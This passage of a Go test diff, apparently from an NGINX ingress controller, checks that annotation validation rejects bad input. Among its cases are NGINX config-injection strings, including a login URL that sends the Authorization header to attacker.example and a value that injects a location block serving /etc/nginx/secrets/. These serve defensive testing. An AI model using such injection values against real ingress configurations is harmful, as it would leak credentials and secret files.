+				fmt.Sprintf(`annotations.%s: Invalid value: "$cookie_auth_token\\": %s`, configs.JWTTokenAnnotation, jwtTokenValueFmtErrMsg),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing escape characters", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: "cookie_auth$token",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "cookie_auth$token": %s`, configs.JWTTokenAnnotation, jwtTokenValueFmtErrMsg),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing incorrect variable", configs.JWTTokenAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTTokenAnnotation: "$cookie_auth_token$http_token",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "$cookie_auth_token$http_token": %s`, configs.JWTTokenAnnotation, jwtTokenValueFmtErrMsg),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing more than 1 variable", configs.JWTTokenAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf("annotations.%s: Forbidden: annotation requires NGINX Plus", configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, nginx plus only", configs.JWTLoginURLAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            fmt.Sprintf("valid %s annotation", configs.JWTLoginURLAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: `https://login.example.com\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com\\": parse "https://login.example.com\\": invalid character "\\" in host name`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing escape character at the end", configs.JWTLoginURLAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: `https://{login.example.com`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://{login.example.com": parse "https://{login.example.com": invalid character "{" in host name`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, containing invalid character", configs.JWTLoginURLAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "login.example.com",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "login.example.com": scheme required, please use the prefix http(s)://`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, scheme missing", configs.JWTLoginURLAnnotation),
+		},
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "http:",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "http:": hostname required`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, hostname missing", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path;return%20403",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path;return%%20403": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains semicolon injection", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://attacker.example/leak?a=$http_authorization",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://attacker.example/leak?a=$http_authorization": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains dollar sign variable expansion", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://h/x;}location /pwned {alias /etc/nginx/secrets/;",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://h/x;}location /pwned {alias /etc/nginx/secrets/;": must not contain characters that could cause NGINX config injection (;, {, }, $, newline, carriage return, or backtick)`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains braces and semicolons for block injection", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path with spaces",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path with spaces": must not contain spaces, quotes, backslashes, hash or tab characters`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains spaces", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				configs.JWTLoginURLAnnotation: "https://login.example.com/path#test",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+			expectedErrors: []string{
+				fmt.Sprintf(`annotations.%s: Invalid value: "https://login.example.com/path#test": must not contain spaces, quotes, backslashes, hash or tab characters`, configs.JWTLoginURLAnnotation),
+			},
+			msg: fmt.Sprintf("invalid %s annotation, contains hash character", configs.JWTLoginURLAnnotation),
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/listen-ports": "80,8080,9090,44313",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/listen-ports annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/listen-ports": "not_a_port_list",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/listen-ports: Invalid value: "not_a_port_list": must be a comma-separated list of port numbers`,
+			},
+			msg: "invalid nginx.org/listen-ports annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/listen-ports-ssl": "443,8443,44315",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/listen-ports-ssl annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/listen-ports-ssl": "not_a_port_list",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/listen-ports-ssl: Invalid value: "not_a_port_list": must be a comma-separated list of port numbers`,
+			},
+			msg: "invalid nginx.org/listen-ports-ssl annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/keepalive": "1000",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/keepalive annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/keepalive": "not_a_number",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/keepalive: Invalid value: "not_a_number": must be an integer`,
+			},
+			msg: "invalid nginx.org/keepalive annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/max-fails": "5",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/max-fails annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/max-fails": "-100",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/max-fails: Invalid value: "-100": must be a non-negative integer`,
+			},
+			msg: "invalid nginx.org/max-fails annotation, negative number",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/max-fails": "not_a_number",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/max-fails: Invalid value: "not_a_number": must be a non-negative integer`,
+			},
+			msg: "invalid nginx.org/max-fails annotation, not a number",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/max-conns": "10",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/max-conns annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/max-conns": "-100",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/max-conns: Invalid value: "-100": must be a non-negative integer`,
+			},
+			msg: "invalid nginx.org/max-conns annotation, negative number",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/max-conns": "not_a_number",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/max-conns: Invalid value: "not_a_number": must be a non-negative integer`,
+			},
+			msg: "invalid nginx.org/max-conns annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/fail-timeout": "10s",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/fail-timeout annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/fail-timeout": "not_a_time",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/fail-timeout: Invalid value: "not_a_time": must be a time`,
+			},
+			msg: "invalid nginx.org/fail-timeout annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "$binary_remote_addr",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/limit-req-key annotation, simple variable",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "${binary_remote_addr}",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/limit-req-key annotation, braced variable",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "$binary_remote_addr$request_uri",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/limit-req-key annotation, multiple variables",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "} limit_req_zone $x zone=z:1m rate=1r/s; server {",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/limit-req-key: Invalid value: "} limit_req_zone $x zone=z:1m rate=1r/s; server {": must consist of one or more NGINX variable references ($varname or ${varname}); must not contain ';', '"', '\', or newline characters (e.g. '$binary_remote_addr',  or '${request_uri}', regex used for validation is '^(\$\{[a-zA-Z_][a-zA-Z0-9_]*\}|\$[a-zA-Z_][a-zA-Z0-9_]*)+$')`,
+			},
+			msg: "invalid nginx.org/limit-req-key annotation, injection attempt with semicolon and braces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "$binary_remote_addr; evil",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/limit-req-key: Invalid value: "$binary_remote_addr; evil": must consist of one or more NGINX variable references ($varname or ${varname}); must not contain ';', '"', '\', or newline characters (e.g. '$binary_remote_addr',  or '${request_uri}', regex used for validation is '^(\$\{[a-zA-Z_][a-zA-Z0-9_]*\}|\$[a-zA-Z_][a-zA-Z0-9_]*)+$')`,
+			},
+			msg: "invalid nginx.org/limit-req-key annotation, semicolon injection",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/limit-req-key": "not_a_variable",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/limit-req-key: Invalid value: "not_a_variable": must consist of one or more NGINX variable references ($varname or ${varname}); must not contain ';', '"', '\', or newline characters (e.g. '$binary_remote_addr',  or '${request_uri}', regex used for validation is '^(\$\{[a-zA-Z_][a-zA-Z0-9_]*\}|\$[a-zA-Z_][a-zA-Z0-9_]*)+$')`,
+			},
+			msg: "invalid nginx.org/limit-req-key annotation, no NGINX variable",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-enable: Forbidden: annotation requires AppProtect",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-enable annotation, requires app protect",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-enable annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-enable": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.appprotect.f5.com/app-protect-enable: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid appprotect.f5.com/app-protect-enable annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.appprotect.f5.com/app-protect-enable: Forbidden: annotation requires NGINX Plus`,
+			},
+			msg: "invalid appprotect.f5.com/app-protect-enable annotation, requires NGINX Plus",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log-enable: Forbidden: annotation requires AppProtect",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-enable annotation, requires app protect",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-security-log-enable annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-enable": "not_a_boolean",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.appprotect.f5.com/app-protect-security-log-enable: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-enable annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-enable": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.appprotect.f5.com/app-protect-security-log-enable: Forbidden: annotation requires NGINX Plus`,
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-enable annotation, requires NGINX Plus",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-policy": "default/dataguard-alarm",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-policy annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-policy": `default/dataguard\alarm`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-policy: Invalid value: \"default/dataguard\\\\alarm\": must be a qualified name",
+			}, msg: "invalid appprotect.f5.com/app-protect-policy annotation, not a qualified name",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-policy": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-policy: Forbidden: annotation requires AppProtect",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-policy annotation, requires AppProtect",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-policy": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-policy: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-policy annotation, requires NGINX Plus",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-policy": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-policy: Required value",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-policy annotation, requires value",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": "default/logconf",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-security-log annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": `default/logconf,default/logconf2`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-security-log annotation, multiple values",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": `default/logconf\`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log: Invalid value: \"default/logconf\\\\\": security log configuration resource name must be qualified name, e.g. namespace/name",
+			}, msg: "invalid appprotect.f5.com/app-protect-security-log annotation, not a qualified name",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log: Forbidden: annotation requires AppProtect",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log annotation, requires AppProtect",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log annotation, requires NGINX Plus",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log: Required value",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log annotation, requires value",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": "syslog:server=localhost:514",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-security-log-destination annotation",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": `syslog:server=localhost:514,syslog:server=syslog-svc.default:514`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid appprotect.f5.com/app-protect-security-log-destination annotation, multiple values",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": `syslog:server=localhost\:514`,
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log-destination: Invalid value: \"syslog:server=localhost\\\\:514\": Error Validating App Protect Log Destination Config: error parsing App Protect Log config: Destination must follow format: syslog:server=<ip-address | localhost>:<port> or fqdn or stderr or absolute path to file Log Destination did not follow format",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-destination, invalid value",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log-destination: Forbidden: annotation requires AppProtect",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-destination annotation, requires AppProtect",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": "true",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               false,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log-destination: Forbidden: annotation requires NGINX Plus",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-destination annotation, requires NGINX Plus",
+		},
+		{
+			annotations: map[string]string{
+				"appprotect.f5.com/app-protect-security-log-destination": "",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    true,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotect.f5.com/app-protect-security-log-destination: Required value",
+			},
+			msg: "invalid appprotect.f5.com/app-protect-security-log-destination, requires value",
+		},
+
+		{
+			annotations: map[string]string{
+				"appprotectdos.f5.com/app-protect-dos-resource": "dos-resource-name",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				"annotations.appprotectdos.f5.com/app-protect-dos-resource: Forbidden: annotation requires AppProtectDos",
+			},
+			msg: "invalid appprotectdos.f5.com/app-protect-dos-resource annotation, requires app protect dos",
+		},
+		{
+			annotations: map[string]string{
+				"appprotectdos.f5.com/app-protect-dos-resource": "dos-resource-name",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: true,
+
+			expectedErrors: nil,
+			msg:            "valid appprotectdos.f5.com/app-protect-dos-enable annotation with default namespace",
+		},
+		{
+			annotations: map[string]string{
+				"appprotectdos.f5.com/app-protect-dos-resource": "some-namespace/dos-resource-name",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: true,
+
+			expectedErrors: nil,
+			msg:            "valid appprotectdos.f5.com/app-protect-dos-enable annotation with fully specified identifier",
+		},
+		{
+			annotations: map[string]string{
+				"appprotectdos.f5.com/app-protect-dos-resource": "special-chars-&%^",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: true,
+
+			expectedErrors: []string{
+				"annotations.appprotectdos.f5.com/app-protect-dos-resource: Invalid value: \"special-chars-&%^\": must be a qualified name",
+			},
+			msg: "invalid appprotectdos.f5.com/app-protect-dos-enable annotation with special characters",
+		},
+		{
+			annotations: map[string]string{
+				"appprotectdos.f5.com/app-protect-dos-resource": "too/many/qualifiers",
+			},
+			specServices:         map[string]bool{},
+			isPlus:               true,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: true,
+
+			expectedErrors: []string{
+				"annotations.appprotectdos.f5.com/app-protect-dos-resource: Invalid value: \"too/many/qualifiers\": must be a qualified name",
+			},
+			msg: "invalid appprotectdos.f5.com/app-protect-dos-enable annotation with incorrectly qualified identifier",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/websocket-services": "service-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/websocket-services annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/websocket-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+				"service-2": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/websocket-services annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/websocket-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/websocket-services: Invalid value: "service-1,service-2": must be a comma-separated list of services. The following services were not found: service-2`,
+			},
+			msg: "invalid nginx.org/websocket-services annotation, service does not exist",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-services": "service-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/ssl-services annotation, single-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+				"service-2": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
+			msg:            "valid nginx.org/ssl-services annotation, multi-value",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-services": "service-1,service-2",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: []string{
+				`annotations.nginx.org/ssl-services: Invalid value: "service-1,service-2": must be a comma-separated list of services. The following services were not found: service-2`,
+			},
+			msg: "invalid nginx.org/ssl-services annotation, service does not exist",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/grpc-services": "service-1",
+			},
+			specServices: map[string]bool{
+				"service-1": true,
+			},
+			isPlus:               false,
+			appProtectEnabled:    false,
+			appProtectDosEnabled: false,
+
+			expectedErrors: nil,
